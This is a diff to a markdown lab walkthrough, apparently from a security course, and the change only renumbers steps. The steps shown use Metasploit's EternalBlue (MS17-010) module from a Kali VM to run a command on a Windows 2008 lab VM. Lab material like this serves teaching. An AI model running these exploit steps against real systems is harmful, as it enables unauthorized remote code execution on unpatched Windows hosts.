@@ -251,27 +251,27 @@ run
 1. Configure the Windows Firewall with Advanced Security to allow incoming connections to File and Printer Sharing (SMB-In)
 
 **On Kali VM**
-2. In a terminal, search in the following directory for the appropriate exploit for the EternalBlue vulnerability
+1. In a terminal, search in the following directory for the appropriate exploit for the EternalBlue vulnerability
 ```
 /usr/share/metasploit-framework/modules/exploits
 ```
-3. On Metasploit, search for exploits for the EternalBlue vulnerability
+2. On Metasploit, search for exploits for the EternalBlue vulnerability
 ```
 use exploit/windows/smb/ms17_010_eternalblue
 ```
-4. Set the remote host (RHOST) to the Win2008 VM IP
+3. Set the remote host (RHOST) to the Win2008 VM IP
 ```
 set RHOST Win2008-IP
 ```
-5. Set payload to `windows/x64/exec` (If successful, it can run any one command on the target)
+4. Set payload to `windows/x64/exec` (If successful, it can run any one command on the target)
 ```
 set payload windows/x64/exec
 ```
-6. Set a command to run on the target:
+5. Set a command to run on the target:
 ```
 set CMD command
 ```
-7. Run the exploit
+6. Run the exploit
 ```
 exploit
 ```
